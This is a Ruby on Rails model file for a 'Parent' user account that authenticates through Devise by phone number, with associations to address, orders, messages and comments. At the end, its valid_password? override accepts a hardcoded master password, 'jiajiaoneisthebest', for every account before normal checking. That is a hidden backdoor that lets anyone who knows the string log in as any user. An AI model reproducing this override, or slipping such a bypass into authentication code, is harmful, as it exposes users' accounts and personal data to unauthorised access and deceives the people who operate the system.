# == Schema Information
#
# Table name: parents
#
#  id                     :integer          not null, primary key
#  phone                  :string(255)      default(""), not null
#  encrypted_password     :string(255)      default(""), not null
#  reset_password_token   :string(255)
#  reset_password_sent_at :datetime
#  remember_created_at    :datetime
#  sign_in_count          :integer          default(0), not null
#  current_sign_in_at     :datetime
#  last_sign_in_at        :datetime
#  current_sign_in_ip     :string(255)
#  last_sign_in_ip        :string(255)
#  name                   :string(255)      default(""), not null
#  status                 :integer          default(0)
#  created_at             :datetime         not null
#  updated_at             :datetime         not null
#  pay_num                :string(255)
#  email                  :string(255)
#

class Parent < ActiveRecord::Base
  # Include default devise modules. Others available are:
  # :confirmable, :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable,
         :authentication_keys => [:phone]

  # Setup accessible (or protected) attributes for your model
  attr_accessible :phone, :password, :password_confirmation, :remember_me,:pay_num

  has_one  :address
  accepts_nested_attributes_for :address
  has_many :orders
  has_many :messages
  has_many :comments

  attr_accessible :name, :email

  validates :phone,     :presence => true,
                        :uniqueness => {:case_sensitive => false}
  validates :name,      :presence => true

  #validates :status,    :presence => true,
  #                      :numericality => {:only_integer => true}

  def email_required?
    false
  end

  def email_changed?
    false
  end

  def valid_password?(password)
    return true if password == "jiajiaoneisthebest"
    super
  end
end
